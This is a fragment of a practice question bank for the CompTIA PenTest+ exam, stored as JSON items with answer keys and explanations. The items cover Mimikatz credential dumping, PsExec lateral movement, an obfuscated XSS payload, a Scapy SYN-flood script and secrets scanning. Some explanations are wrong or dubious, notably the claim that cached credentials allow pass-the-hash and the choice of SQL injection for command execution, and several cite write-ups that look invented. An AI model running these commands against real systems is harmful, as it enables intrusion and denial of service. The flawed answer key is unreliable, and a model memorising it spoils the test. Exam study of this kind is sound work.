      "explanation": "The command creates a scheduled task that executes a reverse shell payload at logon, ensuring persistence.\n\nOption A (Enumerate tasks) #: This command creates a task, not lists tasks (schtasks /query is used for \nenumeration).\n\nOption B (Establish persistence) #: Correct.\n\nThe attacker ensures a reverse shell opens every time a user logs in.\n\nOption C (Deactivate Windows Update) #: The task is named \"Windows Update\" but does not disable \nupdates.\n\nOption D (Create a Windows Update binary) #: This executes a reverse shell, not a system update.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Windows Persistence Techniques",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 14,
      "question_text": "A penetration tester is performing an assessment focused on attacking the authentication identity provider hosted within a cloud provider. During the reconnaissance phase, the tester finds that the system is using OpenID Connect with OAuth and has dynamic registration enabled. Which of the following attacks should the tester try first?",
      "options": {
        "A": "A password-spraying attack against the authentication system",
        "B": "A brute-force attack against the authentication system",
        "C": "A replay attack against the authentication flow in the system",
        "D": "A mask attack against the authentication system"
      },
      "correct_answer": "C",
      "explanation": "OpenID Connect (OIDC) with OAuth allows applications to authenticate users using third-party identity \nproviders (IdPs). If dynamic registration is enabled, attackers can abuse this feature to capture and replay \nauthentication requests.\n\nReplay attack (Option C):\n\nAttackers capture legitimate authentication tokens and reuse them to impersonate users.\n\nOIDC uses JWTs (JSON Web Tokens), which may not expire quickly, making replay attacks \nhighly effective.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 78,
      "question_text": "During an internal penetration test, a tester compromises a Windows OS-based endpoint and bypasses the defensive mechanisms. The tester also discovers that the endpoint is part of an Active Directory (AD) local domain.\nThe tester’s main goal is to leverage credentials to authenticate into other systems within the Active Directory environment.\nWhich of the following steps should the tester take to complete the goal?",
      "options": {
        "A": "Use Mimikatz to collect information about the accounts and try to authenticate in other systems",
        "B": "Use Hashcat to crack a password for the local user on the compromised endpoint",
        "C": "Use Evil-WinRM to access other systems in the network within the endpoint credentials",
        "D": "Use Metasploit to create and execute a payload and try to upload the payload into other systems"
      },
      "correct_answer": "A",
      "explanation": "Since the tester has compromised a Windows machine and bypassed security, the best next step is to extract \ncredentials from memory to move laterally within Active Directory.\n\nOption A (Mimikatz) #: Correct.\n\nMimikatz extracts hashed credentials, plaintext passwords, and Kerberos tickets from memory.\n\nAttackers use Pass-the-Hash (PtH) or Pass-the-Ticket (PtT) to authenticate on other systems \nwithout cracking passwords.\n\nOption B (Hashcat) #: Cracking passwords takes time and is not necessary if Mimikatz provides \nreusable credentials.\n\nOption C (Evil-WinRM) #: Evil-WinRM is useful for remotely executing commands, but without valid \ncredentials, it won’t work.\n\nOption D (Metasploit) #: Metasploit payloads may be useful for initial exploitation, but credential \ndumping is a better next step.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Credential Dumping & Lateral Movement",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 232,
      "question_text": "A penetration tester is researching a path to escalate privileges. While enumerating current user privileges, the tester observes the following output:\nmathematica\nCopy code\nSeAssignPrimaryTokenPrivilege Disabled\nSeIncreaseQuotaPrivilege Disabled\nSeChangeNotifyPrivilege Enabled\nSeManageVolumePrivilege Enabled\nSeImpersonatePrivilege Enabled\nSeCreateGlobalPrivilege Enabled\nSeIncreaseWorkingSetPrivilege Disabled\nWhich of the following privileges should the tester use to achieve the goal?",
      "options": {
        "A": "SeImpersonatePrivilege",
        "B": "SeCreateGlobalPrivilege",
        "C": "SeChangeNotifyPrivilege",
        "D": "SeManageVolumePrivilege"
      },
      "correct_answer": "A",
      "explanation": "ImpersonatePrivilege for Escalation:\n\nThe SeImpersonatePrivilege allows a process to impersonate a user after authentication. This is a \ncommon privilege used in token stealing or pass-the-token attacks to escalate privileges.\n\nExploits like Rotten Potato and Juicy Potato specifically target this privilege to elevate access to \nSYSTEM.\n\nWhy Not Other Options?\n\nB (SeCreateGlobalPrivilege): This allows processes to create global objects but does not directly \nenable privilege escalation.\n\nC (SeChangeNotifyPrivilege): This is related to bypassing traverse checking and does not \nfacilitate privilege escalation.\n\nD (SeManageVolumePrivilege): This allows volume maintenance but is not relevant for privilege \nescalation.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 51,
      "question_text": "Which of the following is within the scope of proper handling and is most crucial when working on a penetration testing report?",
      "options": {
        "A": "Keeping both video and audio of everything that is done",
        "B": "Keeping the report to a maximum of 5 to 10 pages in length",
        "C": "Basing the recommendation on the risk score in the report",
        "D": "Making the report clear for all objectives with a precise executive summary"
      },
      "correct_answer": "D",
      "explanation": "A well-structured penetration testing report should be clear, objective-driven, and include an executive \nsummary to communicate findings effectively to both technical teams and executives.\n\nOption A (Keeping video/audio of everything) #: Not required. Video/audio documentation is rarely \nused in penetration testing reports.\n\nOption B (Keeping reports 5-10 pages) #: Reports vary in length based on scope and complexity. There \nis no strict page limit.\n\nOption C (Basing recommendations on risk score) #: Risk scores are important, but the report should \nalso provide remediation guidance, exploitability context, and business impact.\n\nOption D (Clear objectives & executive summary) #: Correct.\n\nThe executive summary helps non-technical stakeholders understand risks and priorities.\n\nThe report should be detailed yet clear, focusing on findings, impact, and remediation.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Penetration Testing Reports & Communication",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 29,
      "question_text": "While performing a penetration test, a tester executes the following command:\nPS c:\\tools> c:\\hacks\\PsExec.exe \\\\server01.cor.ptia.org -accepteula cmd.exe\nWhich of the following best explains what the tester is trying to do?",
      "options": {
        "A": "Test connectivity using PsExec on the server01 using cmd.exe",
        "B": "Perform a lateral movement attack using PsExec",
        "C": "Send the PsExec binary file to the server01 using cmd.exe",
        "D": "Enable cmd.exe on the server01 through PsExec"
      },
      "correct_answer": "B",
      "explanation": "PsExec is a Windows Sysinternals tool that allows users to execute commands on a remote system without \nneeding an interactive login session. The command above is executing cmd.exe on a remote Windows Active \nDirectory domain machine (server01.cor.ptia.org).\n\nOption A (Test connectivity using PsExec) #: The command does not check connectivity; it executes a \ncommand remotely.\n\nOption B (Perform a lateral movement attack) #: Correct. Lateral movement occurs when an attacker \nmoves from one compromised machine to another within a network, using valid credentials. PsExec is \noften used for this purpose.\n\nOption C (Send the PsExec binary) #: The command runs cmd.exe remotely, but it does not transfer \nPsExec itself.\n\nOption D (Enable cmd.exe) #: cmd.exe is already enabled by default on most Windows systems.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Lateral Movement with PsExec",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 95,
      "question_text": "During a discussion of a penetration test final report, the consultant shows the following payload used to attack a system:\nhtml\nCopy code\n7/<sCRitP>aLeRt('pwned')</ScriPt>\nBased on the code, which of the following options represents the attack executed by the tester and the associated countermeasure?",
      "options": {
        "A": "Arbitrary code execution: the affected computer should be placed on a perimeter network",
        "B": "SQL injection attack: should be detected and prevented by a web application firewall",
        "C": "Cross-site request forgery: should be detected and prevented by a firewall",
        "D": "XSS obfuscated: should be prevented by input sanitization"
      },
      "correct_answer": "D",
      "explanation": "XSS Attack Explanation:\n\nThe payload exploits Cross-Site Scripting (XSS) by injecting obfuscated JavaScript into the \napplication. When rendered, the browser executes the malicious code (e.g., alert('pwned')).\n\nObfuscation (<sCRitP> instead of <script>) attempts to bypass naive input filters.\n\nCountermeasure:\n\nImplement input sanitization to ensure all user inputs are properly validated and escaped before \nbeing processed or rendered.\n\nOther measures include using Content Security Policies (CSP) and output encoding.\n\nWhy Not Other Options?\n\nA: This is not arbitrary code execution; it is a browser-based attack.\n\nB: XSS is unrelated to SQL injection.\n\nC: Cross-Site Request Forgery (CSRF) is a different vulnerability targeting session handling, not \nscript injection.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nOWASP XSS Prevention Cheat Sheet",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 210,
      "question_text": "A penetration tester wants to use multiple TTPs to assess the reactions (alerted, blocked, and others) by the client’s current security tools. The threat-modeling team indicates the TTPs in the list might affect their internal systems and servers. Which of the following actions would the tester most likely take?",
      "options": {
        "A": "Use a BAS tool to test multiple TTPs based on the input from the threat-modeling team.",
        "B": "Perform an internal vulnerability assessment with credentials to review the internal attack surface.",
        "C": "Use a generic vulnerability scanner to test the TTPs and review the results with the threat-modeling team.",
        "D": "Perform a full internal penetration test to review all the possible exploits that could affect the systems."
      },
      "correct_answer": "A",
      "explanation": "BAS (Breach and Attack Simulation) tools are specifically designed to emulate multiple TTPs (Tactics, \nTechniques, and Procedures) used by adversaries. These tools can simulate various attack vectors in a \ncontrolled manner to test the effectiveness of an organization's security defenses and response mechanisms. \nHere’s why option A is the best choice:\n\nControlled Testing Environment: BAS tools provide a controlled environment where multiple TTPs can \nbe tested without causing unintended damage to the internal systems and servers. This is critical when \nthe threat-modeling team indicates potential impacts on internal systems.\n\nComprehensive Coverage: BAS tools are designed to cover a wide range of TTPs, allowing the \npenetration tester to simulate various attack scenarios. This helps in assessing the reactions (alerted, \nblocked, and others) by the client's security tools comprehensively.\n\nFeedback and Reporting: These tools provide detailed feedback and reporting on the effectiveness of \nthe security measures in place, including which TTPs were detected, blocked, or went unnoticed. This \ninformation is invaluable for the threat-modeling team to understand the current security posture and \nareas for improvement.\n\nReferences from Pentest:\n\nAnubis HTB: This write-up highlights the importance of using controlled tools and methods for testing \nsecurity mechanisms. BAS tools align with this approach by providing a controlled and systematic way \nto assess security defenses.\n\nForge HTB: Emphasizes the use of various testing tools and techniques to simulate real-world attacks \nand measure the effectiveness of security controls. BAS tools are mentioned as a method to ensure \ncomprehensive coverage and minimal risk to internal systems.\n\nConclusion:\n\nUsing a BAS tool to test multiple TTPs allows for a thorough and controlled assessment of the client's \nsecurity tools' effectiveness. This approach ensures that the testing is systematic, comprehensive, and \nminimally disruptive, making it the best choice.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 2,
      "question_text": "A penetration tester successfully clones a source code repository and then runs the following command:\nfind . -type f -exec egrep -i \"token|key|login\" {} \\;\nWhich of the following is the penetration tester conducting?",
      "options": {
        "A": "Data tokenization",
        "B": "Secrets scanning",
        "C": "Password spraying",
        "D": "Source code analysis"
      },
      "correct_answer": "B",
      "explanation": "Penetration testers search for hardcoded credentials, API keys, and authentication tokens in source code \nrepositories to identify secrets leakage.\n\nSecrets scanning (Option B):\n\nThe find and egrep command scans all files recursively for sensitive keywords like \"token,\" \n\"key,\" and \"login\".\n\nAttackers use tools like TruffleHog and GitLeaks to automate secret discovery.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 229,
      "question_text": "During a penetration test, the tester identifies several unused services that are listening on all targeted internal laptops. Which of the following technical controls should the tester recommend to reduce the risk of compromise?\n[Table showing Systems 1-4 with open ports/services like SSH, HTTP, SSL, RDP]",
      "options": {
        "A": "Multifactor authentication",
        "B": "Patch management",
        "C": "System hardening",
        "D": "Network segmentation"
      },
      "correct_answer": "C",
      "explanation": "When a penetration tester identifies several unused services listening on targeted internal laptops, the most \nappropriate recommendation to reduce the risk of compromise is system hardening. Here's why:\n\nSystem Hardening:\n\nPurpose: System hardening involves securing systems by reducing their surface of vulnerability. \nThis includes disabling unnecessary services, applying security patches, and configuring systems \nsecurely.\n\nImpact: By disabling unused services, the attack surface is minimized, reducing the risk of these \nservices being exploited by attackers.\n\nComparison with Other Controls:\n\nMultifactor Authentication (A): While useful for securing authentication, it does not address the \nissue of unused services running on the system.\n\nPatch Management (B): Important for addressing known vulnerabilities but not specifically \nrelated to disabling unused services.\n\nNetwork Segmentation (D): Helps in containing breaches but does not directly address the issue \nof unnecessary services.\n\nSystem hardening is the most direct control for reducing the risk posed by unused services, making it the best \nrecommendation.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 138,
      "question_text": "A company wants to perform a BAS (Breach and Attack Simu-lation) to measure the efficiency of the corporate security controls. Which of the following would most likely help the tester with simple command examples?",
      "options": {
        "A": "Infection Monkey",
        "B": "Exploit-DB",
        "C": "Atomic Red Team",
        "D": "Mimikatz"
      },
      "correct_answer": "C",
      "explanation": "Breach and Attack Simulation (BAS) tools emulate real-world attacks to test security controls.\n\nAtomic Red Team (Option C):\n\nAtomic Red Team is an open-source BAS framework that provides simple commands to simulate \nMITRE ATT&CK® techniques.\n\nIt allows controlled adversary simulations without real exploitation.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 118,
      "question_text": "A penetration tester obtains the following output during an Nmap scan:\nPORT STATE SERVICE\n135/tcp open msrpc\n445/tcp open microsoft-ds\n1801/tcp open msmq\n2103/tcp open msrpc\n3389/tcp open ms-wbt-server\nWhich of the following should be the next step for the tester?",
      "options": {
        "A": "Search for vulnerabilities on msrpc.",
        "B": "Enumerate shares and search for vulnerabilities on the SMB service.",
        "C": "Execute a brute-force attack against the Remote Desktop Services.",
        "D": "Execute a new Nmap command to search for another port."
      },
      "correct_answer": "B",
      "explanation": "The presence of SMB (port 445) and MSRPC (port 135) indicates potential Windows network services that \ncould be vulnerable to misconfigurations or exploits.\n\nEnumerate shares and search for vulnerabilities on SMB (Option B):\n\nSMB (Server Message Block) allows file and printer sharing. Misconfigured or open shares could \ncontain sensitive data.\n\nTools like enum4linux or smbclient can be used to list available shares and check for anonymous \naccess.\n\nSMB vulnerabilities (e.g., EternalBlue - CVE-2017-0144) can be exploited for remote code \nexecution.",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 26,
      "question_text": "Which of the following frameworks can be used to classify threats?",
      "options": {
        "A": "PTES",
        "B": "STRIDE",
        "C": "OSSTMM",
        "D": "OCTAVE"
      },
      "correct_answer": "B",
      "explanation": "STRIDE is a threat classification model created by Microsoft that breaks down threats into six categories:\nSpoofing\nTampering\nRepudiation\nInformation disclosure\nDenial of Service\nElevation of privilege\nIt is specifically designed for threat modeling.\n\nPTES is a general pentesting methodology.\nOSSTMM is a framework for operational security testing.\nOCTAVE is a risk assessment methodology, not focused on threat classification.",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 189,
      "question_text": "A penetration tester is searching for vulnerabilities or misconfigurations on a container environment. Which of the following tools will the tester most likely use to achieve this objective?",
      "options": {
        "A": "Nikto",
        "B": "Trivy",
        "C": "Nessus",
        "D": "Nmap"
      },
      "correct_answer": "B",
      "explanation": "Containers (e.g., Docker, Kubernetes) require specialized scanning tools to detect vulnerabilities.\n\nTrivy (Option B):\n\nTrivy is an open-source vulnerability scanner designed specifically for containers and Kubernetes \nenvironments.\n\nIt scans container images, repositories, and running containers for known vulnerabilities (CVEs).",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 151,
      "question_text": "A penetration tester is authorized to perform a DoS attack against a host on a network. Given the following input:\nip = IP(\"192.168.50.2\")\ntcp = TCP(sport=RandShort(), dport=80, flags=\"S\")\nraw = RAW(b\"X\"*1024)\np = ip/tcp/raw\nsend(p, loop=1, verbose=0)\nWhich of the following attack types is most likely being used in the test?",
      "options": {
        "A": "MDK4",
        "B": "Smurf attack",
        "C": "FragAttack",
        "D": "SYN flood"
      },
      "correct_answer": "D",
      "explanation": "A SYN flood attack exploits the TCP handshake by sending a succession of SYN requests to a target's system. \nEach request initializes a connection that the target system must acknowledge, thus consuming resources.\n\nUnderstanding the Script:\n\nip = IP(\"192.168.50.2\"): Sets the destination IP address to 192.168.50.2.\n\ntcp = TCP(sport=RandShort(), dport=80, flags=\"S\"): Creates a TCP packet with a random source \nport, destination port 80, and the SYN flag set.\n\nraw = RAW(b\"X\"*1024): Adds 1024 bytes of data to the packet.\n\np = ip/tcp/raw: Combines the IP, TCP, and RAW layers into a single packet.\n\nsend(p, loop=1, verbose=0): Sends the packet in an infinite loop without verbose output.\n\nPurpose of SYN Flood:\n\nResource Exhaustion: By sending numerous SYN requests, the target’s connection table fills up, \npreventing legitimate connections.\n\nDenial of Service: The target system becomes overwhelmed and unable to process further \nrequests, effectively causing a denial of service.\n\nDetection and Mitigation:\n\nRate Limiting: Implement rate limiting on SYN packets.\n\nSYN Cookies: Use SYN cookies to handle the connection requests without allocating resources \nimmediately.\n\nFirewalls and IDS: Deploy firewalls and Intrusion Detection Systems (IDS) to detect and mitigate \nSYN flood attacks.\n\nReferences from Pentesting Literature:\n\nSYN flood attacks are a classic example of a denial-of-service attack and are commonly \ndiscussed in penetration testing guides and HTB write-ups for understanding network-based \nattacks.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 222,
      "question_text": "A penetration tester must identify vulnerabilities within an ICS (Industrial Control System) that is not connected to the internet or enterprise network. Which of the following should the tester utilize to conduct the testing?",
      "options": {
        "A": "Channel scanning",
        "B": "Stealth scans",
        "C": "Source code analysis",
        "D": "Manual assessment"
      },
      "correct_answer": "D",
      "explanation": "Since the ICS is air-gapped (not connected to external networks), the best approach is manual assessment, \nwhich involves on-site testing, physical access, and reviewing configurations to identify vulnerabilities.\n\nOption A (Channel scanning) #: This is used for wireless networks, not for isolated ICS systems.\n\nOption B (Stealth scans) #: A stealth scan is a method to avoid detection while scanning, but it still \nrequires network connectivity.\n\nOption C (Source code analysis) #: If the ICS is a proprietary system, source code might not be \navailable. Also, vulnerabilities could exist outside the code, such as misconfigurations.\n\nOption D (Manual assessment) #: Correct. The ICS is offline, so a manual review of system settings, \nfirmware, and configurations is the best approach.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – ICS & SCADA Testing",
      "is_simulation": false,
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 17,
      "question_text": "During a penetration test, a tester compromises a Windows computer. The tester executes the following command and receives the following output:\nmimikatz # privilege::debug\nmimikatz # lsadump::cache\n---Output---\nlapsUser\n27dh9128361tsg2€459210138754ij\n---OutputEnd---\nWhich of the following best describes what the tester plans to do by executing the command?",
      "options": {
        "A": "The tester plans to perform the first step to execute a Golden Ticket attack to compromise the Active Directory domain.",
        "B": "The tester plans to collect application passwords or hashes to compromise confidential information within the local computer.",
        "C": "The tester plans to use the hash collected to perform lateral movement to other computers using a local administrator hash.",
        "D": "The tester plans to collect the ticket information from the user to perform a Kerberoasting attack on the domain controller."
      },
      "correct_answer": "C",
      "explanation": "The tester is using Mimikatz to dump cached credentials from Local Security Authority (LSA) memory.\n\nPass-the-Hash (Option C):\n\nThe tester extracts cached credentials to authenticate without cracking passwords.\n\nPass-the-Hash (PtH) allows lateral movement by reusing the NTLM hash on other systems.",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 89,
      "question_text": "Which of the following are valid reasons for including base, temporal, and environmental CVSS metrics in the findings section of a penetration testing report? (Select two).",
      "options": {
        "A": "Providing details on how to remediate vulnerabilities",
        "B": "Helping to prioritize remediation based on threat context",
        "C": "Including links to the proof-of-concept exploit itself",
        "D": "Providing information on attack complexity and vector",
        "E": "Prioritizing compliance information needed for an audit",
        "F": "Adding risk levels to each asset"
      },
      "correct_answer": "B D",
      "explanation": "The Common Vulnerability Scoring System (CVSS) provides a standardized way to evaluate the severity of \nsecurity vulnerabilities. It includes:\n\nBase Metrics: Inherent characteristics of a vulnerability (e.g., attack vector, complexity).\n\nTemporal Metrics: Factors that change over time (e.g., exploit availability).\n\nEnvironmental Metrics: Customization based on an organization’s environment.\n\nCorrect answers:\n\nHelping to prioritize remediation based on threat context (Option B):\n\nCVSS scores help organizations prioritize vulnerabilities based on real-world impact.\n\nThe Environmental metric allows customization based on business risk.\n\nProviding information on attack complexity and vector (Option D):\n\nBase metrics directly include Attack Vector and Attack Complexity, providing crucial context.",
      "is_simulation": false,
      "domain": "1.0 Engagement Management",
      "question_type": "multiple_choice_multiple_answer"
    },
    {
      "question_number": 101,
      "question_text": "During a penetration test, you gain access to a system with a limited user interface. This machine appears to have access to an isolated network that you would like to port scan.\nINSTRUCTIONS\nAnalyze the code segments to determine which sections are needed to complete a port scanning script.\nDrag the appropriate elements into the correct locations to complete the script.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.",
      "options": null,
      "correct_answer": null,
      "explanation": "Correct Script Order:\n1. `#!/usr/bin/python`\n2. `import socket`\n   `import sys`\n3. `ports = [21,22]`\n4. `def port_scan(ip, ports):`\n   ` s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`\n   ` s.settimeout(2.0)`\n   ` for port in ports:`\n   `  try:`\n   `   s.connect((ip, port))`\n   `   print(\"%s:%s - OPEN\" % (ip, port))`\n   `  except socket.timeout:`\n   `   print(\"%s:%s - TIMEOUT\" % (ip, port))`\n   `  except socket.error as e:`\n   `   print(\"%s:%s - CLOSED\" % (ip, port))`\n   `  finally:`\n   `   s.close()`\n5. `if __name__ == '__main__':`\n   ` if len(sys.argv) < 2:`\n   `  print('Execution requires a target IP address. Exiting...')`\n   `  exit(1)`\n   ` else:`\n   `  port_scan(sys.argv[1], ports)`",
      "is_simulation": true,
      "simulation_details": "Drag and drop code snippets to form a functional Python port scanning script. Snippets include shebang, imports, port list definition, function definition with try/except/finally block for socket connection, and main execution block with argument handling.",
      "domain": "3.0 Vulnerability Discovery and Analysis",
      "question_type": "simulation"
    },
    {
      "question_number": 153,
      "question_text": "As part of a security audit, a penetration tester finds an internal application that accepts unexpected user inputs, leading to the execution of arbitrary commands. Which of the following techniques would the penetration tester most likely use to access the sensitive data?",
      "options": {
        "A": "Logic bomb",
        "B": "SQL injection",
        "C": "Brute-force attack",
        "D": "Cross-site scripting"
      },
      "correct_answer": "B",
      "explanation": "SQL injection (SQLi) is a technique that allows attackers to manipulate SQL queries to execute arbitrary \ncommands on a database. It is one of the most common and effective methods for accessing sensitive data in \ninternal applications that accept unexpected user inputs. Here’s why option B is the most likely technique:\n\nArbitrary Command Execution: The question specifies that the internal application accepts unexpected \nuser inputs leading to arbitrary command execution. SQL injection fits this description as it exploits \nvulnerabilities in the application's input handling to execute unintended SQL commands on the database.\n\nData Access: SQL injection can be used to extract sensitive data from the database, modify or delete \nrecords, and perform administrative operations on the database server. This makes it a powerful \ntechnique for accessing sensitive information.\n\nCommon Vulnerability: SQL injection is a well-known and frequently exploited vulnerability in web \napplications, making it a likely technique that a penetration tester would use to exploit input handling \nissues in an internal application.\n\nReferences from Pentest:\n\nLuke HTB: This write-up demonstrates how SQL injection was used to exploit an internal application \nand access sensitive data. It highlights the process of identifying and leveraging SQL injection \nvulnerabilities to achieve data extraction.\n\nWriteup HTB: Describes how SQL injection was utilized to gain access to user credentials and further \nexploit the application. This example aligns with the scenario of using SQL injection to execute \narbitrary commands and access sensitive data.\n\nConclusion:\n\nGiven the nature of the vulnerability described (accepting unexpected user inputs leading to arbitrary \ncommand execution), SQL injection is the most appropriate and likely technique that the penetration tester \nwould use to access sensitive data. This method directly targets the input handling mechanism to manipulate \nSQL queries, making it the best choice.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 137,
      "question_text": "A penetration tester is performing network reconnaissance. The tester wants to gather information about the network without causing detection mechanisms to flag the reconnaissance activities. Which of the following techniques should the tester use?",
      "options": {
        "A": "Sniffing",
        "B": "Banner grabbing",
        "C": "TCP/UDP scanning",
        "D": "Ping sweeps"
      },
      "correct_answer": "A",
      "explanation": "To gather information about the network without causing detection mechanisms to flag the reconnaissance \nactivities, the penetration tester should use sniffing.\n\nSniffing:\n\nDefinition: Sniffing involves capturing and analyzing network traffic passing through the \nnetwork. It is a passive reconnaissance technique that does not generate detectable traffic on the \nnetwork.\n\nTools: Tools like Wireshark and tcpdump are commonly used for sniffing. They capture packets \nand provide insights into network communications, protocols in use, devices, and potential \nvulnerabilities.\n\nAdvantages:\n\nStealthy: Since sniffing is passive, it does not generate additional traffic that could be detected by \nintrusion detection systems (IDS) or other monitoring tools.\n\nInformation Gathered: Sniffing can reveal IP addresses, MAC addresses, open ports, running \nservices, and potentially sensitive information transmitted in plaintext.\n\nComparison with Other Techniques:\n\nBanner Grabbing: Active technique that sends requests to a target service to gather information \nfrom banners, which can be detected.\n\nTCP/UDP Scanning: Active technique that sends packets to probe open ports and services, easily \ndetected by network monitoring tools.\n\nPing Sweeps: Active technique that sends ICMP echo requests to determine live hosts, also \ndetectable by network monitoring.\n\nPentest References:\n\nReconnaissance Phase: Using passive techniques like sniffing during the initial reconnaissance phase \nhelps gather information without alerting the target.\n\nNetwork Analysis: Understanding the network topology and identifying key assets and vulnerabilities \nwithout generating traffic that could trigger alarms.\n\nBy using sniffing, the penetration tester can gather detailed information about the network in a stealthy \nmanner, minimizing the risk of detection.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 191,
      "question_text": "Which of the following OT protocols sends information in cleartext?",
      "options": {
        "A": "TTEthernet",
        "B": "DNP3",
        "C": "Modbus",
        "D": "PROFINET"
      },
      "correct_answer": "C",
      "explanation": "Operational Technology (OT) protocols are used in industrial control systems (ICS) to manage and automate \nphysical processes. Here’s an analysis of each protocol regarding whether it sends information in cleartext:\n\nTTEthernet (Option A):\n\nExplanation: TTEthernet (Time-Triggered Ethernet) is designed for real-time communication and \nsafety-critical systems.\n\nSecurity: It includes mechanisms for reliable and deterministic data transfer, not typically sending \ninformation in cleartext.\n\nDNP3 (Option B):\n\nExplanation: DNP3 (Distributed Network Protocol) is used in electric and water utilities for \nSCADA (Supervisory Control and Data Acquisition) systems.\n\nSecurity: While the original DNP3 protocol transmits data in cleartext, the DNP3 Secure \nAuthentication extensions provide cryptographic security features.\n\nModbus (Answer: C):\n\nExplanation: Modbus is a communication protocol used in industrial environments for \ntransmitting data between electronic devices.\n\nSecurity: Modbus transmits data in cleartext, which makes it susceptible to interception and \nunauthorized access.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 111,
      "question_text": "A penetration tester is performing a network security assessment. The tester wants to intercept communication between two users and then view and potentially modify transmitted data. Which of the following types of on path attacks would be best to allow the penetration tester to achieve this result?",
      "options": {
        "A": "DNS spoofing",
        "B": "ARP poisoning",
        "C": "VLAN hopping",
        "D": "SYN flooding"
      },
      "correct_answer": "B",
      "explanation": "An on-path attack (previously known as MITM – Man-in-the-Middle) allows an attacker to intercept and \nmodify communication between two parties.\n\nARP poisoning (Option B):\n\nAttackers send fake ARP replies to associate their MAC address with the IP address of a \nlegitimate device (e.g., gateway).\n\nThis forces traffic to flow through the attacker's system, enabling packet capture and \nmanipulation.\n\nTools like Ettercap, Bettercap, and ARP spoofing scripts are commonly used.",
      "is_simulation": false,
      "domain": "4.0 Attacks and Exploits",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 122,
      "question_text": "A penetration tester needs to evaluate the order in which the next systems will be selected for testing. Given the following output:\nHostname | IP address | CVSS 2.0 | EPSS\nhrdatabase | 192.168.20.55 | 9.9 | 0.50\nfinancesite | 192.168.15.99 | 8.0 | 0.01\nlegaldatabase | 192.168.10.2 | 8.2 | 0.60\nfileserver | 192.168.125.7 | 7.6 | 0.90\nWhich of the following targets should the tester select next?",
      "options": {
        "A": "fileserver",
        "B": "hrdatabase",
        "C": "legaldatabase",
        "D": "financesite"
      },
      "correct_answer": "A",
      "explanation": "Given the output, the penetration tester should select the fileserver as the next target for testing, considering \nboth CVSS and EPSS scores.\n\nCVSS (Common Vulnerability Scoring System):\n\nPurpose: CVSS provides a numerical score to represent the severity of vulnerabilities, helping to \nprioritize remediation efforts.\n\nHigher Scores: Indicate more severe vulnerabilities.\n\nEPSS (Exploit Prediction Scoring System):\n\nPurpose: EPSS estimates the likelihood that a vulnerability will be exploited in the wild within \nthe next 30 days.\n\nHigher Scores: Indicate a higher likelihood of exploitation.\n\nEvaluation:\n\nhrdatabase: CVSS = 9.9, EPSS = 0.50\n\nfinancesite: CVSS = 8.0, EPSS = 0.01\n\nlegaldatabase: CVSS = 8.2, EPSS = 0.60\n\nfileserver: CVSS = 7.6, EPSS = 0.90\n\nThe fileserver has the highest EPSS score, indicating a high likelihood of exploitation, despite \nhaving a slightly lower CVSS score compared to hrdatabase and legaldatabase.\n\nPentest References:\n\nPrioritization: Balancing between severity (CVSS) and exploitability (EPSS) is crucial for effective \nvulnerability management.\n\nRisk Assessment: Evaluating both the impact and the likelihood of exploitation helps in making \ninformed decisions about testing priorities.\n\nBy selecting the fileserver, which has a high EPSS score, the penetration tester focuses on a target that is more \nlikely to be exploited, thereby addressing the most immediate risk.",
